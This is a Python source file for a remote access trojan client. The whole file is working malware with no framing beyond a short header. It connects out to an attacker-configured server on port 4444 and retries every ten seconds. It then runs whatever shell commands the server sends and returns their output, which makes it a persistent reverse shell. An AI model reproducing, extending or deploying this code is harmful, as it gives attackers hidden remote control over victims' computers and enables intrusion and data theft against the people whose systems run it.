#!/usr/bin/env python3
"""
BASIC RAT CLIENT
"""

import socket
import subprocess
import os
import json
import base64
import sys
import time

class RATClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connected = False
        
    def reliable_send(self, data):
        """Send data to server"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            json_data = json.dumps(data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data)
            encoded_data = base64.b64encode(json_data.encode('utf-8'))
            self.socket.send(len(encoded_data).to_bytes(4, 'big') + encoded_data)
            return True
        except Exception as e:
            print(f"Send error: {e}")
            return False

    def reliable_receive(self):
        """Receive data from server"""
        try:
            raw_len = self.socket.recv(4)
            if not raw_len:
                return None
            data_len = int.from_bytes(raw_len, 'big')
            data = b''
            while len(data) < data_len:
                packet = self.socket.recv(data_len - len(data))
                if not packet:
                    return None
                data += packet
            
            decoded_data = base64.b64decode(data)
            return json.loads(decoded_data)
        except Exception as e:
            print(f"Receive error: {e}")
            return None

    def connect_to_server(self):
        """Connect to RAT server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.server_host, self.server_port))
            self.connected = True
            print(f"[+] Connected to {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            print(f"Connection error: {e}")
            return False

    def execute_command(self, command):
        """Execute command locally"""
        try:
            if command.startswith('cd '):
                os.chdir(command[3:])
                return os.getcwd()
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return str(e)

    def start_client(self):
        """Start client main loop"""
        while True:
            try:
                if not self.connected:
                    if not self.connect_to_server():
                        print("[-] Retrying in 10 seconds...")
                        time.sleep(10)
                        continue
                
                # Receive command from server
                command = self.reliable_receive()
                if not command:
                    print("[-] Server disconnected")
                    self.connected = False
                    continue
                
                if command.lower() in ['exit', 'quit']:
                    print("[*] Disconnecting...")
                    break
                
                # Execute command
                result = self.execute_command(command)
                
                # Send result back
                if not self.reliable_send(result):
                    self.connected = False
                    continue
                    
            except socket.timeout:
                print("[-] Connection timeout")
                self.connected = False
            except KeyboardInterrupt:
                print("\n[*] Client shutdown")
                break
            except Exception as e:
                print(f"Client error: {e}")
                self.connected = False
                time.sleep(10)
        
        if self.connected:
            self.socket.close()

if __name__ == "__main__":
    # Configuration
    SERVER_HOST = "192.168.1.100"  # Change to your server IP
    SERVER_PORT = 4444
    
    client = RATClient(SERVER_HOST, SERVER_PORT)
    client.start_client()